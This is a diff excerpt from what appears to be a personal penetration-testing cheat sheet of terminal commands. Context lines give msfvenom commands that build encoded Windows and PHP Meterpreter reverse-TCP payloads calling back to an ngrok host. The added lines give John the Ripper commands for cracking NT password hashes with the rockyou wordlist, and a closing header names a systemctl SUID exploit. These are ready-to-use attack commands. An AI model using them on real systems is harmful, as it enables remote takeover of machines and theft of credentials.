@@ -1362,6 +1362,11 @@ bash/zsh + linux terminal cli tools commands
 - msfvenom:
     - windows: msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 25 LHOST=0.tcp.ngrok.io LPORT=12345 -f exe > 1.exe
     - php: msfvenom -p php/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=12345 -f raw -o page.php
+- john: john the ripper (password hashdump cracker)
+  - displayed results of file: john --show ./hash.txt
+  - windows type hashes: --format=NT
+  - use wordlist: john --wordlist=/usr/share/wordlists/rockyou.txt ~/hashes.txt
+  - {https://bytesoverbombs.io/cracking-everything-with-john-the-ripper-d434f0f6dc1c}
 
 ---------------------------------------------------------------------
 exploit using systemctl (SUID config)
